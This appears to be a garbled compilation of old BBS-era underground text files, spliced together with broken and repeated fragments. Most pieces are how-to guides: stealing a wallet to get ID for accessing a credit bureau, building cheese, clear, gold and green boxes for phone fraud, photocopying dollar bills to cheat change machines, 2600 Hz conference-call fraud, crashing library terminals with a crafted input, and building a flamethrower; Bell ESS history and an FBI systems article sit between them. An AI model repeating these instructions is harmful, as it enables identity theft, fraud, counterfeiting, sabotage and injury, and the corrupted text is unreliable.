         The next step should be, obtain a drivers license or some other form
 of ID that contains a person's name, address, and social security number.  If
 you do not have this, you can't get shit, you definitely need their social
 security number for this.  The best thing to do is go casing (* check other
 X Organization files on casing *) and steal a wallet containing a drivers
 license.

 *** STEPS TO ACCESSING CBI ***

         Secondly, you should examine the whole printout, and make sure you
 can read everything on the printout, you don't want to fuck it up, be as
 efficient as possible, even though CBI does allow you to make some mistakes
 before it disconnects.

 *** LOGIN TO CBI ***

         Now, you should have everything set out next to you for quick online
 reference.  Dial the number at 300 BPS, E, 7, 1.  Check on the printout if the
 CBI port has more than 300 Baud, it just might.  If you cannot find a local
 port for CBI try 1-800-624-1395.  Note: everything inive:< > is me making a note.

-           Cheese Box Info            -
----------------------------------------

       A Cheesebox(named for the type of
box the first one was found in)is a
type of box which will, in effect, make
your telephone a Pay Phone.....This is a
simple,modernized, and easy way of
doing it....

      Inside Info:These were first used
by bookies many years ago as a way of
making calls to people without being
called Dy the cops or having their
numbers traced and/or tapped......

     How To Make A Modern Cheese Box

     Ingredients:

     1 Call Forwarding service on the
       line

     1 Set of Red Box Tones

     The number to your prefix's
Intercept operator(do some scanning
for this one)

     How To:

       After you find the number to the
intercept operator in your prefix,
use your ome scanning
for this one)

     How To:

       After you find the number to the
intercept operator in your prefix,
use your call forwarding and forward all
calls to her...this will make your
phone stay off the hook(actually, now it
waits foD a quarter to be dropped
in)...you now have a cheese box...In
Order To Call Out On This Line:You
must use your Red Box tones and generate
the quarter dropping
in...then,you can make phone calls to
people...as far as I know, this is
fairly safe, and theD do not check
he quarter dropping
in...then,you can make phone calls to
people...as far as I know, this is
fairly safe, and theD do not check
much...Although I
am not sure, I think you can even make
credit card calls from a cheesebox
phone and not get traced.

                            Clear Box Plans


   The clear box is a new device which has just been invented that can be used
throughout Canada and rural United States. The clear box works on "Post-Pay"
payphones (fortress fones). Those are the payphones that dont require payment
until after the connection is established. You pick up the fone, get
a dial tone, dial your number, and then insert your money after the person
answers.If you dont deposit the money then you can not speak to the person on
the other end- because your mouth piece is cut off, but, not the ear piece.
(obviously these phones are nice for free calls to weather or time or
other such recordings).All you must do is to go to your nearby Radio Shack, or
electronics store,and get a four-transistor amplifier and a
telephone suction cup induction pick-up. The induction pick-up would be
hooked up as it normally would to record a conversation, except that it
would be plugged into the out-
put of the amplifier and a microphone would be hooked to the input. So when
the party that is being called answers, the caller could speak through the
little microphone instead. His voice then goes through the amplifier and out
the induction coil, and into the back of the reciever where it would then be
broadcast through the phone lines and the other party would be able to hear
the caller. The Clear Box thus 'clears up' the problem of not being heard.
Luckily, the line will not be cut-off after a certain amount of time because
it will wait forever for the coins to be put in.The biggest advantage for all
of us about this new clear box is the exfact that this type of payphone will most likely become very common.
Due to a few things: 1st, it is a cheap way of getting the DTF,dial-tone-first
service, 2nd, it doesnt require any special equipment, (for the phone
company)This payphone will work on any phone line. Ususally a payphone line is
different, but this is a regular phone line and it is set up so the phone
does all the charging, not the company.

->HOW TO RIP OFF A CHANGE MACHINE<-
-----------------------------------

  SO YA NEED MONEY, AND YA NEED IT
FAST!?  WELL HERE IS A FAST AND EASY
WAY TO CHANGE YOUR NICKELS AND DIMES
INTO QUARTERS!

HERE'S THE EQUIPMENT THAT YOU NEED
ACCESS TO IN A FAIRLY SECLUDED AREA:

1) A COPY MACHINE THAT IS OF FAIRLY
   GOOD QUALITY.. (THE ONES AT MY
   COLLEGE ARE SHITTY, BUT THEY WORK
   ANYWAY...)

2) A CHANGE MACHINE THAT CHANGES 1'S
   AND 5'S TO QUARTERS.

3) A 1 OR 5 DOLLAR BILL

4) A TABLE PAPER CUTTER THAT CUTS PAPER
   EXACTLY STRAIGHT.

5) A LOT OF COURAGE!


OK WHAT YOU DO IS WALK INTO THE PLACE
AND COPY THE FACE SIDE OF YOUR DOLLAR.
PUT THE DOLLAR BILL FACE DOWN AND IN
THE EXACT MIDDLE OF THE MACHINE'S
WINDOW.  THE FIRST TIME YOU DO THIS,
ONLY MAKE ONE COPY, BECAUSE IT MIGHT
NOT WORK CORRECTLY.  WHEN YOU GET YOUR
COPIED DOLLAR BILL FROM THE MACHINE,
CHECK THE TONER AND MAKE SURE THAT IT
IS JUST LIKE THE ORIGINAL.  IF ITS TOO
DARK OR TOO LIGHT, THEN ADJUST THE COPY
MACHINE ACCORDINGLY.  WHEN YOU GET A
PERFECTLY CONTRASTED DOLLAR, TAKE IT
OVER TO THE PAPER CUTTER AND PUT THE
ORIGINAL DOLLAR OVER THE PAPER DOLLAR
AND SLICE THE DOLLAR OUT OF THE BIG
PIECE OF PAPER.  NOW FOR THE PHUN PART.

MAKE SURE THAT THCRE ARE NO HIDDEN
CAMERAS IN THE ROOM WATCHING YOU, OR
YOU'LL BE CAUGHT FOR SURE!!!!!!!!!!

WALK UP TO THE CHANGE MACHINE AND
CASUALLY SLIDE THE DOLLAR BILL INTO
THE MACHINE AND PUSH THE CARRIAGE
OR WHATEVER IN.  IF THE DOLLAR COMES
BACK OUT THEN TAKE IT, RIP IT IN HALF
AND PUT IT IN YOUR POCKET.  THROW IT
AWAY SOMEPLACE ELSE.  BUT IF THE
JINGLING JOY OF QUARTERS COMES, YOU
WILL BE IN THE MONEY!!!!  BUT WHEN YOU
DO IT, DO IT IN MASS AMMOUNTS, BECAUSE
IF YOU DO ONE A DAY, THEY'LL PROBABLY
POST A GUARD IN THERE OR SOMETHING...

THIS METHOD GOT ME $10 IN ONE SESSION,
BUT I'M SURE THE NEXT TIME I GO BACK
THERE I'LL MAKE A LOT MORE....HEH HEH

HAVE PHUN NOW, AND TELL ME YOUR RECORD
WINNINGS IN ONE DAY... BETTER THAN THE
LOTTERY!

 HOW TO START YOUR OWN CONFERENCES!

BLACK BART SHOWED HOW TO START A CONFERENCE CALL THRU AN 800 EXCHANGE, AND I
WILL NOW EXPLAIN HOW TO START A CONFERENCE CALL IN A MORE ORTHODOX FASHIO, THE
2600 HZ. TONE.

FIRSTLY, THE FONE COMPANY HAS WHAT IS CALLED SWITCHING SYSTEMS.  THERE ARE SE
VERAL TYPES, BUT THC ONE WE WILL CONCERN OURSELVES WITH, IS ESS (ELECTRONIC
SWITCHING SYSTEM).  IF YOUR AREA IS ZONED FOR ESS, DO NOT START A CONFERENCE
CALL VIA THE 2600 HZ. TONE, OR BELL SECURITY WILL NAIL YOUR ASS!  TO FND OUT IF
YOU ARE UNDER ESS, CALL YOUR LOCAL BUSINESS OFFICE, AND ASK THEM IF YOU CAN GET
CALL WAITING/FORWARDING, AND IF YOU CAN, THAT MEANS THAT YOU ARE IN ESS COUNTRY
, AND CONFERENCE CALLING IS VERY, VERY DANGEROUS!!! NOW, IF YOU ARE NOT IN ESS,
YOU WILL NEED THE FOLLOWING EQUIPMENT:

  AN APPLE CAT II MODEM
  A COPY OF TSPS 2 OR CAT'S MEOW
  A TOUCH TONE FONE LINE
  AND A TOUCH TONE FONE. (TRUE TONE)

NOW, WITH TSPS 2, DO THE FOLLOWING:

 RUN TSPS 2
 CHOSE OPTION 1
 CHOSE OPTION 6
 CHOSE SUB-OPTION 9

  NOW TYPE:

 1-514-555-1212 (DASHES ARE NOT NEEDED)

LISTEN WITH YOUR HANDSET, AND AS SOON AS YOU HEAR A LOUD 'CLICK', THEN TYPE

 $

TO GENERATE THE 2600 HZ. TONE.  THIS OBNOXIOUS TONE WILL CONTINUE FOR A FEW
SECONDS, THEN LISTEN AGAIN AND YOU SHOULD HEAR ANOTHER LOUD 'CLICK'.

 NOW TYPE:

 KM2130801050S

WHERE 'K' = KP TONE
      'M' = MULTI FREQUENCY MODE
      'S' = S TONE

NOW LISTEN TO THE HANDSET AGAIN, AND WAIT UNTIL YOU HEAR THE 'CLICK' AGAIN.
THEN TYPE:

  KM2139752975S

WHERE 2139751975 IS THE NUMBER TO BILL THE CONFERENCE CALL TO. NOTE: 213-975-
1975 IS A DISCONNECTED NUMBER, AND I STRONGLY ADVISE THAT YOU ONLY BILL THE
CALL TO THIS NUMBER, OR THE FONE COMPANY WILL FIND OUT, AND THEN..........
REMEBER, CONFERENCE CALLS ARE ITEMIZED, SO IF YOU DO BILL IT TO AN ENEMY'S NUMB
ER, HE CAN EASILY FIND OUT WHO DID IT AND HE CAN BUST YOU!

YOU SHOULD NOW HEAR 3 BEEPS, AND A SHORT PRE-RECORDED MESSAGE.  FROM HERE ON,
EVERYTHING IS ALL MENU DRIVEN.

 CONFERENCE CALL COMMANDS
 ---------- ---- --------

   FROM THE '#' MODE:

     1 = CALL A NUMBER
     6 = TRANSFER CONTROL
     7 = HANGS UP THE CONFERENCE CALL
     9 = WILL CALL A CONFERENCE OPERATR

STAY AWAY FROM 7 AND 9!  IF FOR SOME REASON AN OPERATOR GETS ON-LINE,
HANG UP! IF YOU GET A BUSY SIGNAL AFTER KM2130801050S, THAT MEANS THAT THE
TELECONFEREN CING LINE IS TEMPORARILY DOWN.  TRY LATER, PREFERRABLY FROM 9AM TO
5PM WEEK DAYS, SINCE CONFERENCE CALLS ARE PRIMARILY DESIGNED FOR BUSINESS
PEOPLE.

   HOWDY.  WELL, THIS IS MY FIRST CDC FILE I'VE WRITTEN IN AWHILE SINCE I'VE
BEEN AWAY AND TOYING AROUND WITH ALOT OF NEW IDEAS AND STUFF OF THAT MATTER.
BY THE WAY, THIS SHOULD ONLY BE DONE BY REAL AND EXPERIENCED HACKERS LIKE
MYSELF AND TEQUILA WILLY!  DON'T TRY THIS AT HOME!!  ANYWAY, ON WITH THE FILE.

THE STORY BEHIND IT ALL
=======================

   WELL, TODAY I WAS OUT WITH MY GIRLFRIEND AT THC LIBRARY, YES, I WANTED TO
PICK UP A COPY OF HYDE'S 'THE PHONE BOOK' (A BOOK ABOUT TELEPHONE FRAUD AND
BOXING AND OTHER NEATO THINGS).  WELL, TO CONTINUE WITH MY ACTION PACKED
EXCITEMENT, I NOTICED THAT THC LIBRARY STILL HAS THE OLD CARD CATALOG, BUT IT
NOW HAS COMPUTER-OPERATED CATALOGS.  IT'S RUN ON A DIGITAL-VT1200 COMPUTER
(I THINK THAT'S WHAT IT'S CALLED), THE SYSTEM SORT OF RESEMBLED UNIX IN A WAY.
ANmiliWAY, I WAS FIDDLING WITH THE COMPUTER AND PLAYED WITH IT FOR AT LEAST 15
MINUTES.  THIS BITCHY LADY CAME OVER AND TOLD ME TO 'STOP MESSING WITH THE
DAMN COMPUTERS!!' I REPLIED 'FUCK YOU, I'M LOOKING FOR A BOOK!'   SHE WALKED
AWAY IN DISGUST.  A SINISTER SMILE CAME UPON MY LIPS AND MY FINGERS BLAZED
AWAY AT THE KEYS.  I TRIED EVERYTHING FOR 10 MINUTES LIKE SYSTEM, COM, BOX,
CARD, AND EVEN HACKER (I WAS DESPERATE!).  SO I JUST TYPED IN MUMBO-JUMBO
FOR LIKE 10 MINUTES AND THEN I JUST TYPED IN DOS.  THE SCREEN FLICKERED, IT
READ:

                         CAMDEN COUGTY LIBRARY SYSTEM

          f                 1.  MENION DATABASE
                            2.  INFOTRON DATABASE

  PLEASE SELECT A NEW DATABASE.  YOU ARE CURRENTLY CONNECTED TO MENION.

>> 2 (IS WHAT I TYPED)
INFOTRON DATABASE IS UNAVAILABLE.  SORRY.

  IT THEN RETURNED TO THE MAIN MENU WHERE I SHOULD SELECT A BOOK.  I TYPED
DOS AGAIN, WENT BACK, BUT THIS TIME I TYPED:

>> 2,99E99 (1 MORE THAN THE LARGEST NUMBER A SMALL-COMPUTER CAN HANDLE)

IT PRINTED:

FATAL ERROR! SYSTEM ERROR!
ERROR IN LINE 10200, OFF.

  THEN THE WHOLE SYSTEM FROZE UP.  THE BITCHYnougheDY WALKED OVER AGAIN AND Y CANLED
AT ME AGAIN.  I PLAYED DUMB, 'DUH, I DON'T KNOW WHAT I DID!'  SHE DEMANDED THAT
I MOVE TO ANOTHER TERMINAL (BY THE WAY, THE LIBRARY IS EQUIPPED WITH 9
TERMINALS AT 3 TABLES PER FLOOR, THAT'S 27 ACCESSABLE TERMINALS PER FLOOR!
YES, I CAN MULTIPLY!!) SO I OBLIDGED AND MOVED TO ANOTHER TERMINAL.  I WATCHED
HER FIDDLE AND FUCK WITH THE FUCKED-UP TERMINAL FOR 10-15 MINUTES.  SHE DID
EVERYTHING.  TURNED IT ON/OFF, SLAPPED IT, BANGED IT, EVERYTHING.  THEN SHE
PUT AN 'OUT OF ORDER' SIGN ON IT.  SO I FUCKED UP THE COMPUTER I WAS ON, THEN
DID 3 OTHERS, THEN MOVED TO THE NEXT FLOOR.

HOW TO DO IT: A RUN DOWN
========================
AT >> ON THE SELECT BOOen,/AUTHOR/CARD # MENU TYPE 'DOS'
AT >> ON THE DATABASE ENTRY MENU TYPE '2,99E99'
THEN SIT BACK AND WATCH THE FUN.

TERMINALS
=========

  THESE TERMINALS WERE JUST MONITORS AND KEYBOARDS, NO PROCESSOR, NOTHING.  IT
WAS OBVIO.SLY CONNECTED TO AnougheRGER MAINFRAME WITHIN THE BUILDING.  I SUSPECT
IF YOU MESS WITH THE TERMINALS MORE YOU MIGHT BE ABLE TO EXIT TO DOS, CRASH
IT PERMANENTLY, DIAL OUT VIA THERE MODEM SOMEWHERE, OR SEND NEAT0 MESSAGES TO
OTHER TERMINALS WITHIN THE BUILDING.  HAVE FUN WITH THIS.

   OF ALL THE NEW 1960S WONDERS OF TELEPHONE TECHNOLOGY -
SATELLITES, ULTRA MODERN TRAFFIC SERVICE POSITIONS (TSPS) FOR
OPERATORS, THE PICTUREPHONE, AND SO ON - THE ONE THAT GAVE BELL
LABS THE MOST TROUBLE, AND UNEXPECTEDLY BECAME THE GREATEST
DEVELOPMENT EFFORT IN BELL SYSTEM'S HISTORY, WAS THE PERFECTION
OF AN ELECTRONIC SWITCHING SYSTEM, OR ESS.

   IT MAY BE RECALLED THAT SUCH A SYSTEM WAS THE SPECIFIC END IN
VIEW WHEN THE PROJECT THAT HAD CULMINATED IN THE INVENTION OF THE
TRANSISTOR HAD BEEN LAUNCHED BACK IN THE 1930S. AFTER SUCCESSFUL
ACCOMPLISHMENT OF THAT PLANNED MIRACLE IN 1947-48, FURTHER DELAYS
WERE BROUGHT ABOUT BY FINANCIAL STRINGENCY AND THE NEED FOR
FURTHER DEVELOPMENT OF THE TRANSISTOR ITSELF. IN THE EARLY 1950S,
A LABS TEAM BEGAN SERIOUS WORK ON ELECTRONIC SWITCHING. AS EARLY
AS 1955, WESTERN ELECTRIC BECAME INVOLVED WHEN FIVE ENGINEERS
FROM THE HAWTHORNE WORKS WERE ASSIGNED TO COLLABORATE WITH THE
LABS ON THE PROJECT. THE PRESIDENT OF AT&T IN 1956, WROTE
CONFIDENTLY, "AT BELLnougheBS, DEVELOPMENT OF THE NEW ELECTRONIC
SWITCHING SYSTEM IS GOING FULL SPEED AHEAD. WE ARE SURE THIS WILL
LEAD TO MANY IMPROVEMENTS IN SERVICE AND ALSO TO GREATER
EFFICIENCY. THE FIRST SERVICE TRIAL WILL START IN MORRIS, ILL.,
IN 1959." SHORTLY THEREAFTER, KAPPEL SAID THAT THE COST OF THE
WHOLE PROJECT WOULD PROBABLY BE $45 MILLION.

   BUT IT GRADUALLY BECAME APPARENT THAT THE DEVELOPEMENT OF A
COMMERCIALLY USABLE ELECTRONIC SWITCHING SYSTEM - IN EFFECT, A
COMPUTERIZED TELEPHONE EXCHANGE - PRESENTED VASTLY GREATER
TECHNICAL PROBLEMS THAN HAD BEEN ANTICIPATED, AND THAT,
ACCORDINGLY, BELLnLABS HAD VASTLY UNDERESTIMATED BOTH THE TIME
AND THE INVESTMENT NEEDED TO DO THE JOB. THE YEAR 1959 PASSED
WITHOUT THC PROMISED FIRST TRIAL AT MORRIS, ILLINOIS; IT WAS
FINALLY MADE IN NOVEMBER 1960, AND QUICKLY SHOWED HOW MUCH MORE
WORK REMAINED TO BE DONE. E DIRIME DRAGGED ON AND COSTS MOUNTED,
THERE WAS A CONCERN AT AT&T AND SOMETHING APPROACHING PANIC AT
BELLnLABS. BUT THC PROJECT HAD TO GO FORWARD; BY THIS TIME THE
INVESTMENT WAS TOO GREAT TO BE SACRIFICED, AND IN ANY CASE,
FORWARD PROJECTIONS OF INCREASED DEMAND FOR TELEPHONE SERVICE
INDICATED THAT WITHIN A PHEW YEARS A TIME WOULD COME WHEN,
WITHOUT THE QUANTUM LEAP IN SPEED AND FLEXIBILITY THAT ELECTRONIC
SWITCHING WOULD PROVIDE, THE NATIONAL NETWORK WOULD BE UNABLE TO
MEET THE DEMAND. IN NOVEMBER 1963, AN ALL-ELECTRONIC SWITCHING
SYSTEM WENT INTO USE AT THE BROWN ENGINEERING COMPANY AT COCOA
BEACH, FLORIDA. BUT THIS WAS A SMALL INSTALLATION, ESSENTIALLY
ANOTHER TEST INSTALLATION, SERVING ONLY A SINGLE COMPANY.
KAPPEL'S TONE ON THE SUBJECT IN THE 1964 ANNUAL REPORT WAS, FOR
HIM, AN ALMOST APOLOGETIC: "ELECTRONIC SWITCHING EQUIPMENT MUST
BE MANUFACTURED IN VOLUME TO UNPRECEDENTED STANDARDS OF
RELIABILITY.... TO TURN OUT THE EQUIPMENT ECONOMICALLY AND WITH
GOOD SPEED, MASS PRODUCTION METHODS MUST BE DEVELOPED; BUT, AT
THE SAME TIME, THERE CAN BE NO LOSS OF PRECISION..." ANOTHER YEAR


.


IILLIONS OF DOLLARS LATER, ON MAY 30, 1965, THE FIRST
COMMERCIAL ELECTRIC CENTERAL OFFICE WAS PUT INTO SERVICE AT
SUCCASUNNA, NEW JERSEY.

   EVEN AT SUCCASUNNA, ONLY 200 OF THE TOWN'S 4,300 SUBSCRIBERS
INITIALLY HAD THE BENEFIT OF ELECTRONIC SWITCHING'S ADDED SPEED
AND ADDITIONAL SERVICES, SUCH AS PROVISION FOR THREE PARTY
CONVERSATIONS AND AUTOMATIC TRANSFER OF INCOMING CALLS. BUT AFTER
THAT, ESS WAS ON ITS WAY. IN JANUARY 1966, THE SECOND COMMERCIAL
INSTALLATION, THIS ONE SERVING 2,900 TELEPHONES, WENT INTO
SERVICE IN CHASE, MARYLAND. BY THE END OF 1967 THERE WERE
ADDITIONAL ESS OFFICES IN CALIFORNIA, CONNECTICUT, MINNESOTA,
GEORGIA, NEW YORK, FLORIDA, AND PENNSYLVANIA; BY THE END OF 1970
THERE WERE 120 OFFICES SERVING 1.8 MILLION CUSTOMERS; AND BY 1974
THERE WERE 475 OFFICES SERVING 5.6 MILLION CUSTOMERS.

   THE DIFFERENCE BETWEEN CONVENTIONAL SWITCHING AND ELECTRONIC
SWITCHING IS THE DIFFERENCE BETWEEN "HARDWARE" AND "SOFTWARE"; IN
THE FORMER CASE, MAINTENENCE IS DONE ON THE SPOT, WITH
SCREWDRIVER AND PLIERS, WHILE IN THE CASE OF ELECTRONIC
SWITCHING, IT CAN BE DONE REMOTELY, BY COMPUTER, FROM A CENTERAL
POINT, MAKING IT POSSIBLE TO HAVE ONLY ONE OR TWO TECHNICIANS ON
DUTY AT A TIME AT EACH SWITCHING CENTER. THE DEVELOPMENT PROGRAM,
WHEN THE FINAL FIGURES WERE ADDED UP, WAS FOUND TO HAVE REQUIRED
A STAGGERING FOUR THOUSAND MAN-YEARS OF WORK AT BELL LABS AND TO
HAVE COST NOT $45 MILLION BUT $500 MILLION!

                THE END

Summary of FBI Computer Systems

By Ralph Harvey

    This article is reprinted from Full BOUT Blosure. Copyright (c) 1986
Capitol Information Association.  All rights reserved. Permission is hereby
granted to reprint this article providing this message is included in its
entirety.  Full Disclosure, Box 8275, Ann Arbor, Michigan 48107. $15/yr.

 The FBI maintains several computer systems.  The most common of which is
call NCIC (National Crime Information Computer). NCIC maintains a database of
information about such things as stolen carsE, 1 len boats, missing persons,
wanted persons, arrest records. It provides quick access to these records by
State, Local and Federal law enforcement agencies.  NCIC is directly linked
with the Treasury Department's TECS computer and many State computer systems.
According to William H. Webster, Director of the FBI:

When a police officer stops a car and is uncertain about who he's going to
meet when he gets out, he can plug into this system [NCIC] and in a matter of
a few seconds he can find out whether that person is a fugitive or the
automobile is stolen. Incidentally, we receive almost 400,000 inquires of
this nature each day in the NCIC system.

 When an agency determines that a subject is a fugitive, it supplies the FBI
computer with as much of the following information as possible: 1) Name and
case number; 2) Alias; 3) Race; 4) Sex; 5) Height; 6) Weight; 7) Color of
hair; 8) Color of eyes; 9) Description of any identifying scars, marks and
tattoos; 10) Date of birth; 11) Place of birth; 12) Social Security Number;
13) Passport Number; 14) Last known address; 15) Nationality; 16) If a
naturalized U.S. Citizen, date, place, and certificate number; 17)
Occupation; 18) The criminal violation with which subject is charged; 19)
Date of warrant; 21) Type of warrant -- Bench, Magistrate, etc.; 22) Agency
holding warrant; 23) Any information as to whether the subject is considered
dangerous, is known to own or currently possess firearms, has suicidal
tendencies, or has previously escaped custody; 24) Driver's license number,
year of expiration and State issued; 25) License number of vehicle, aircraft
or vessel subject owns or is known to use, include the year and State; 26)
Description of vehicle, aircraft or vessel subject owns or is known to use;
27) Associates of the subject*1; 28) FBI number; 29) Name and telephone of
the person to contact when subject is apprehended.

 One of the major problems with the system is that the agency that submits an
entry is responsible for keeping it up to date. Once an entry has been made,
there is little motivation for the originating agency to "waste" its time
keeping it up to date, so many entries become incorrect with the passage of
time.

 Another FBI computer system is their Investigative Support Information
System (ISIS). This system is only used to provide support for major
investigations that require the handling of a large volume of complex
information.  It is limited to handling a maximum of 20 cases at a time.

 The ISIS system was used during the investigation of the murder of Federal
Judge John Wood in San Antonio, Texas. In this case, the FBI entered 300,000
pieces of information, including 6,000 interviews, hotel registration
information from every hotel in the area, etc.  The accused, while on trial,
claimed he was several hundred miles away.  The FBI cross referenced his name
& known alias with the hotel registration database and got a match. Contact
with the hotel employees resulted in a positive identification and conviction
of the subject.

 The FBI has a system called the Organized Crime Information Systems (OCIS)
of which director William Webster is "particularly proud."  The system was
started in 1980 in Detroit, Michigan and is one of their most sophisticated
computers. The system is now functions in over 40 locations.

 The OCIS system allows agents in different field offices to share and
analyze information collected in each other's areas.  This system was used to
identify some of the United States citizens who were released from Cuban
prisons in 1984 that had criminal histories in the United States. An OCIS
link was recently opened in Rome, where it's used to support drug

SIMPLE AS THAT WHERE IT MATTERS IF THE OPERATOR IS SOME NEW EMPLOYEE THAT'S
JUST TRYING TO MAKE A FEW BUCKS AND IF THAT IS RIGHT..  THEY WILL PROBABLY GIVCONSTYOU IT NOT KNOWING THE COMPANY WILL SOON BE INVADED BY HACKERS AND SOON GO OUT
OF BUSINESS AND LOSE HIS/HERS JOB.  BUT THAT'S ANOTHER STORY.  AFTER YOU GET
THE GUTS TO HACK YOUR NEW 950 AND GET AN ACCOUNT..  YOU MAY WANT TO CALL BACK
AND TRY TO GET THERE 800 DIALUP AND POST AROUND YOUR NEWFOUND CODEZ OR BE
GREEDY AND KEEP IT TO YOURSELF SO IT WILL LAST YOU A MONTH OR SO. BUT OF COURSE
THERE IS ANOTHER METHOD WHICH COULD TAKE SOME TIME?  FIND A 950 BY HAND..  GOOD
LUCK!

    BASIC FIREWORKS BY FORD PREFECT

BECAUSE IT IS SOON GOING BE THE 4TH
I THOUGHT I WOULD SHOW YOU HOW TO MAKE
YOUR OWN FIREWORKS. ALL ARE EXPLOSIVE
BUT IN NORMAL QUANTITIES, AND IF THE
DIRECTIONS ARE FOLLOWED CAREFULLY,
THERE IS LITTLE DANGER OF BLOWING
YOURSELF UP.

FIRST IS A LIST OF CHEMICALS WHICH
ARE COMMONLY USED. THESE MIXTURES BURN
WITH DIFFERENT COLORS AND CAN BE USED
FOR A NUMBER OF DIFFERENT THINGS.

THE NUMBERS FOLLOWING ARE PARTS BY
WEI OF EACH OF THE CHEMICALS. PARTS

CHEMICALS & SAFETY:

POTASSIUM NITRATE IS SOLD COMMERCIALLY
AS SALTPETER AND CAN BE FOUND IN ANY
DRUGSTORE. (IT IS USED AS A DIURETIC
FOR ANIMALS) POWDERED SULFUR IS ALSO
SOLD IN A DRUG STORE AND IS USED TO
REPEL TICKS.
CHARCOAL IS NOTHING MORE THAN YOUR
CHARCOAL BRICKETS POWDERED. SObdUM
CHLORIDE, OH COME ON!, TABLE SALT.
SODIUM CARBONATE IS ALSO CALLED SODA,
SODA ASH, SAL SODA, WASHING SODA, OR
GLASSMAKER'S SODA AND IS USED AS A
WATER SOFTENER.
THAT'S ALL I CAN SAY FOR NOW BUT UNTIL
LATER MORE TO COME!!!!

BUILDING A FLAME THROWER FROM THE BOOK:
THE POOR MAN'S JAMES BOND BY KURT SAXON

AN EXCELLENT LITTLE FLAME THROWER
CAN BE MADE, USING JUST ABOUT ANY METAL
OR PLASTIC HAND SQUIRTER. THE ONLY
CONSIDERATION IS (lAT THE LIQUID MUST
COME OUT IN A STREAM INSTEAD OF AN
ATOMIZED SPRAY.

SOME OIL CANS SHOOT A STREAM 30
FEETS. SPRAYERS CAN OFTEN BE ADJUSTED
FROM A SPRAY TO A STREAM. SPRAYERS OF
VARIOUS KINDS CAN BE FOUND IN AUTO
SUPPLY, GARDEN AND GROCERY STORES.

A SIX-INCH TUBE, USUALLY ALUMINUM
OR BRASS, IS FITTEN ON THE NOZZLE. A
WICK OR PIECE OF HEAVY CLOTH IS WIRED
ONTO THE OTHER END OF THE TUBE. THE
FUEL IS GASOLINE, ACETONE OR LIGHTER
FLUID.

TO USE, THE TUBE IS TILTED DOWNWARD
SLIGHTLY. THE SPRAYER IS SQUEEZED
SLOWLY SO THE FUEL WILL DRIBBLE OUT
AND SATURATE THE WICK ALL AROUND.

THE WICK IS THEN LIT AND THE DEVICE
IS AIMED AND SQUEEZED. QUICK, HARD
SQUEEZES WILL SQUIRT THE FUEL THROUGH
THE TUBE AND Pe Cd THE BURNING WICK.
THE WICK IGNITES THE FUEL AND YOU HAVE
SUCH A DANDY WEAPON YOU WILL NEVER STOP
BRAGGING! IF YOU HAVE A LITTLE BROTHER,
HE CAN TAKE IT TO SCHOOL FOR SHOW AND
TELL.

GOLD BOX PLANS: COURTESY OF SIR WILLIAM

HOW TO BUILD IT
_______________


     YOU WILL NEED THE FOLLOWING:

TWO 10K OHM AND THREE 1.4K OHM RESISTOR
ES, TWO 2N3904 TRANSISTORS, TWO PHOTOCE
LLS, TWO RED LED'S (THE MORE LIGHT PROD
UCED THE BETTER), A BOX THAT WILL NOT L
ET LIGHT IN, AND RED AND GREEN WIRE.

 LIGHT FROM THE #1 LED MUST SHING DIREC
TLY ON THE PHOTOCELL #1. THE GOLD BOX I
MAID NEEDED THE TOP OF THE LED'S TO TOU
CH THE PHOTOCELL FOR IT TO WORK.
THE SAME APPLIES TO THE #2 PHOTOCELL AN

THE 1.4K RESISTOR IS VERIABLE AND IF TH

D IT WILL STILL WORK BUT WHEN SOMEONE P
ICKS THE PHONE UP THEY WILL HEAR A FAIN
T DIAL TONE IN THE BACKGROUND AND MIGHT
 REPORT IT TO THE GESTOPO ER...(AT&T).
1.4K WILL GIVE YOU GOOD RECEPTION WITH
LITTLE RISK OF A GESTOPO AGENT AT YOUR
DOOR.


   NOW THAT YOU HAVE BUILT IT TAKE TWO
GREEN WIRES OF THE SAME LENTH STRIP THE
 ENDS, TWIST TWO ENDS TOGETHER AND CONN
ECT THEM TO GREEN1 AND PLACE A PEICE OF
 TAPE ON IT WITH LINE #1 WRITING ON IT.
 CONTINUE THE PROCESS WITH RED1 ONLY US
E RED WIRE. REPEAT WITH RED2 AND GREEN2
 BUT CHANGE TO LINE #2.





HOW TO INSTALL
______________

   YOU WILL NEED TO FIND TWO PHONE LINE
S THAT ARE CLOSE TOGETHER. LABEL ONE OF
 THE PHONES LINES LINE #1.CUT THE PHONE
 LINES AND TAKE THE OUTER COUTING OFF I
T. THERE SHOULD BE 4 WIRES CUT THE Y CANL
OW AND BLACK WIRES OFF AND STRIP THE RE
D AND GREEN WIRES FOR BOTH LINES.

   LINE #1 SHOULD BE IN TWO PEICES TAKE
 THE GREEN WIRE OF ONE END AND CONNECT
IT TO THE ONE OF THE GREEN WIRES ON THE
 GOLD BOX. TAKE THE OTHER HALF OF LINE #
1 AND HOOK THE FREE GREEN WIRE TO THE G
REEN WIRE ON THE PHONE LINE. REPEAT THE
 PROCESS WITH RED1 AND THE OTHER LINE.

   ALL YOU NEED TO DO NOW IS TO RIGHT D
OWN THE PHONE NUMBERS OF THE PLACE YOU
HOOKED IT UP AT AND GO HOME AND CALL IT
. YOU SHOULD GET A DIAL TONE!!!
IF NOT LEAVE ME A MESSAGE ON THE MODEM
MADNESS BBS 516-569-0589 OR TRY CHANGIN
G THE EMITTER WITH COLLECTOR.
OH AND HOOKING IT UP TO A PAYPHONE IS A
 FEDERAL OFFENCE AND IS ILLEAGAL TO PUT
 ON ANY PHONE.  I RECOMMEND YOU SEE YOU
R LOCAL POLICE DEPARTMENT BEFORE DOING
THIS(HAHAHAHAHAHAHAHAHAHAHAHAHAHAHAHA)

[THE GREEN BOX : BIOC AGENT 003'S COURSE IN BASIC TELECOMMUNICATIONS/ PART 6]


   The Green Box generates useful tones such as COIN COLLECT, COIN RETURN, and
RINGBACK.  These are the tones that ACTS or the TSPS operator would send to
the CO when appropriate.  Unfortunately, the green box cannot be used at a
fortress station, but must be used by the CALLED party.  The tones (hz) are:

   COIN COLLECT      700  +  1100
   COIN RETURN      1100  +  1700
   RINGBACK          700  +  1700

   Before the called party sends any of these tones, an operator released
signal should be sent to alert the MF detectors at the CO.  This can be done
by sending 900 + 1500 Hz or a single 2600 Hz wink (90 ms) followed by a 60 ms
gap and then the appropriate signal for at least 900 ms.  also, do not forget
that the initial rate is collected shortly before the 3 minute period is up.

   EVERY CITY HAS ONE OR MORE OFFICES DEDICATED TO ASSIGNING NUMBERS TO THE
TELEPHONE WIRE PAIRS.  THESE OFFICES ARE CALLED DPAC OFFICES AND ARE AVAILABLE
